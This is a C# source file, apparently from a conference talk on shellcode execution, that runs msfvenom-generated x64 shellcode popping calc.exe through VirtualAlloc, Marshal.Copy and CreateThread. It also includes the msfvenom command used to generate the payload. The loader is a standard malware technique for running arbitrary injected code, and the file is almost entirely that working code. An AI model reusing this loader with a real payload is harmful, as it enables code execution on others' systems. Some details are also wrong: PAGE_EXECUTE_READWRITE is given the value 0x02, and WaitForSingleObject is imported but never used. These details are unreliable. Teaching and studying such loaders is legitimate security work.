/*
 * Author: Disc0rdantMel0dy
 * Used in "Krabby Patty's Secret Recipe - An Intro to Shellcode Running" Presentation @Neon Temple.
 * All rights are reserved.
 */

using System;
using System.Runtime.InteropServices;

/*
 * This project is a simple example of executing shellcode in C#.  This project is for demo and educational purposes only.
 * Do not execute this project unless you have explicit permission to do so.  The author takes no responsibility for its usage.
 * In other words, DON'T BE EVIL.
 */

namespace Krabby_Patty_Clean
{
    class Krabby_Patty_Clean
    {       
        //Import VirtualAlloc from Kernel32.dll
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        //Import CreateThread from Kernel32.dll
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        //Import WaitforSingleObject from Kernel32.dll
        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            //This is a simple x64 popcalc shellcode generated from MSFVenom
            //Shellcode Generation CMD (Requires Metasploit Installed: msfvenom -a x64 --platform Windows -p windows/x64/exec CMD=calc.exe -b "\x00\x0a\x0d" -f csharp
            byte[] shellCodeBytes = new byte[] {
                0x48,0x31,0xc9,0x48,0x81,0xe9,
                0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
                0xbb,0x50,0xd1,0xea,0x14,0xac,0x77,0x5b,0x61,0x48,0x31,0x58,
                0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xac,0x99,0x69,
                0xf0,0x5c,0x9f,0x9b,0x61,0x50,0xd1,0xab,0x45,0xed,0x27,0x09,
                0x30,0x06,0x99,0xdb,0xc6,0xc9,0x3f,0xd0,0x33,0x30,0x99,0x61,
                0x46,0xb4,0x3f,0xd0,0x33,0x70,0x99,0x61,0x66,0xfc,0x3f,0x54,
                0xd6,0x1a,0x9b,0xa7,0x25,0x65,0x3f,0x6a,0xa1,0xfc,0xed,0x8b,
                0x68,0xae,0x5b,0x7b,0x20,0x91,0x18,0xe7,0x55,0xad,0xb6,0xb9,
                0x8c,0x02,0x90,0xbb,0x5c,0x27,0x25,0x7b,0xea,0x12,0xed,0xa2,
                0x15,0x7c,0xfc,0xdb,0xe9,0x50,0xd1,0xea,0x5c,0x29,0xb7,0x2f,
                0x06,0x18,0xd0,0x3a,0x44,0x27,0x3f,0x43,0x25,0xdb,0x91,0xca,
                0x5d,0xad,0xa7,0xb8,0x37,0x18,0x2e,0x23,0x55,0x27,0x43,0xd3,
                0x29,0x51,0x07,0xa7,0x25,0x65,0x3f,0x6a,0xa1,0xfc,0x90,0x2b,
                0xdd,0xa1,0x36,0x5a,0xa0,0x68,0x31,0x9f,0xe5,0xe0,0x74,0x17,
                0x45,0x58,0x94,0xd3,0xc5,0xd9,0xaf,0x03,0x25,0xdb,0x91,0xce,
                0x5d,0xad,0xa7,0x3d,0x20,0xdb,0xdd,0xa2,0x50,0x27,0x37,0x47,
                0x28,0x51,0x01,0xab,0x9f,0xa8,0xff,0x13,0x60,0x80,0x90,0xb2,
                0x55,0xf4,0x29,0x02,0x3b,0x11,0x89,0xab,0x4d,0xed,0x2d,0x13,
                0xe2,0xbc,0xf1,0xab,0x46,0x53,0x97,0x03,0x20,0x09,0x8b,0xa2,
                0x9f,0xbe,0x9e,0x0c,0x9e,0xaf,0x2e,0xb7,0x5c,0x16,0x76,0x5b,
                0x61,0x50,0xd1,0xea,0x14,0xac,0x3f,0xd6,0xec,0x51,0xd0,0xea,
                0x14,0xed,0xcd,0x6a,0xea,0x3f,0x56,0x15,0xc1,0x17,0x87,0xee,
                0xc3,0x06,0x90,0x50,0xb2,0x39,0xca,0xc6,0x9e,0x85,0x99,0x69,
                0xd0,0x84,0x4b,0x5d,0x1d,0x5a,0x51,0x11,0xf4,0xd9,0x72,0xe0,
                0x26,0x43,0xa3,0x85,0x7e,0xac,0x2e,0x1a,0xe8,0x8a,0x2e,0x3f,
                0x77,0xcd,0x1b,0x38,0x4f,0x35,0xa9,0x8f,0x14,0xac,0x77,0x5b,
                0x61 };

            //Define Constants for VirtualAlloc
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x02;

            //Allocate Memory inside own process to store shellcode.
            IntPtr ptrAllocatedMemory = VirtualAlloc(                
                IntPtr.Zero,                    //lpAddress
                (UInt32)shellCodeBytes.Length,  //dwSize
                MEM_COMMIT,                     //flAllocationType
                PAGE_EXECUTE_READWRITE);        //flProtect

            //Copy Shellcode into allocated memory
            Marshal.Copy(                
                shellCodeBytes,         //source
                0,                      //startIndex
                ptrAllocatedMemory,     //destination
                shellCodeBytes.Length); //length

            //Set constant for use in CreateThread
            UInt32 threadId = 0;
            
            //Create thread starting at shellcode to set EIP
            IntPtr hThread = CreateThread(                
                IntPtr.Zero,              //lpThreadAttributes
                0,                        //dwStackSize
                ptrAllocatedMemory,       //lpStartAddress
                IntPtr.Zero,              //lpParameter
                0,                        //dwCreationFlags
                ref threadId);            //lpThreadId
            
        }
    }
}